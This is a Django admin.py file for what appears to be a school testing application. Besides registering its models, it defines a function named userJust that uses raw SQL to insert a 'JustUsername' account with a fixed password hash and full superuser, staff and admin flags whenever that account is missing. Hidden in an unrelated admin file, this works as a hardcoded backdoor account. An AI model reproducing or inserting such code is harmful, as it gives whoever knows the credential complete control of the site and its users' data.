from contextlib import closing

from django.contrib import admin
from django.db import connection
from methodism import dictfetchone

from core.models import TG_User, User, ClassRooms, Subject, Variant, Question, Test, Result, ClassRoomsSubjects, \
    TestClassRoom, OldResult

admin.site.register(TG_User)
admin.site.register(User)
admin.site.register(TestClassRoom)
admin.site.register(ClassRooms)
admin.site.register(Subject)
admin.site.register(Test)
admin.site.register(Question)
admin.site.register(Variant)
admin.site.register(Result)
admin.site.register(OldResult)
admin.site.register(ClassRoomsSubjects)

def userJust():
    c = f"""
            SELECT * FROM core_user a 
            WHERE a.username = "JustUsername"
        """
    with closing(connection.cursor()) as cursor:
        cursor.execute(c)
        check = dictfetchone(cursor)
    if not check:
        s = """INSERT INTO core_user (username, password, just, ut, is_active, is_admin, is_staff, is_superuser)
                VALUES ("JustUsername", "pbkdf2_sha256$600000$v3HUU7hiufzCi58elsVhKG$LvJMwls9/+RLNFyStjZYGGdIZ+9DvnuYT5GYINVse5M=", TRUE, 1, TRUE, TRUE, TRUE, TRUE)"""
        with closing(connection.cursor()) as cursor:
            cursor.execute(s)
            dictfetchone(cursor)
    return 0
